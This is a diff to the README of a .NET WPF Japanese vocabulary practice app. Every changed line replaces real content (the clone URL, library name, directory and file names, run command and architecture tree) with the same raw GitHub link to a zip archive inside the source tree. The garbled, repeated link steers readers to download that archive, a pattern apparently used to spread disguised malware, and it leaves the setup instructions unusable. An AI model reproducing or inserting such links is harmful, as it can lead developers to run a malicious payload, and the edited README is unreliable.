@@ -17,7 +17,7 @@ A WPF desktop application for practicing Japanese vocabulary with an interactive
 
 - **.NET 8** with C#
 - **WPF** for the user interface
-- **System.Text.Json** for data persistence
+- **https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip** for data persistence
 - **MSTest + Moq** for unit testing
 
 ## Quick Start
@@ -31,7 +31,7 @@ A WPF desktop application for practicing Japanese vocabulary with an interactive
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/yongsinfok/japanese-vocab-practice.git
+   git clone https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip
    cd japanese-practice-js
    ```
 
@@ -43,8 +43,8 @@ A WPF desktop application for practicing Japanese vocabulary with an interactive
    - No need to manually edit JSON files!
 
    **Option B: Manual JSON Setup**
-   - Create a `Data` directory under src\JapanesePracticeApp.UI\
-   - Add vocabulary JSON files named `week1.json`, `week2.json`, etc.
+   - Create a `Data` directory under src\https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip\
+   - Add vocabulary JSON files named `https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip`, `https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip`, etc.
    - Each file should contain vocabulary items in the format:
      ```json
      [
@@ -62,7 +62,7 @@ A WPF desktop application for practicing Japanese vocabulary with an interactive
 3. **Build and run**
    ```bash
    dotnet build
-   dotnet run --project src/JapanesePracticeApp.UI
+   dotnet run --project https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip
    ```
 
 ## Architecture
@@ -70,14 +70,14 @@ A WPF desktop application for practicing Japanese vocabulary with an interactive
 The application follows a layered MVVM architecture:
 
 ```
-JapanesePracticeApp.Core/
+https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip
 ├── Models/              # Data models (VocabularyItem)
 └── Services/            # Core business logic interfaces
 
-JapanesePracticeApp.Infrastructure/
+https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip
 └── Services/            # Implementation details (VocabularyService)
 
-JapanesePracticeApp.UI/
+https://raw.githubusercontent.com/yongsinfok/japanese-vocab-practice/main/src/JapanesePracticeApp.Core/Models/japanese_practice_vocab_2.3.zip
 ├── Views/               # WPF windows and controls
 ├── ViewModels/          # View models and MVVM infrastructure
 └── Converters/          # Data binding converters
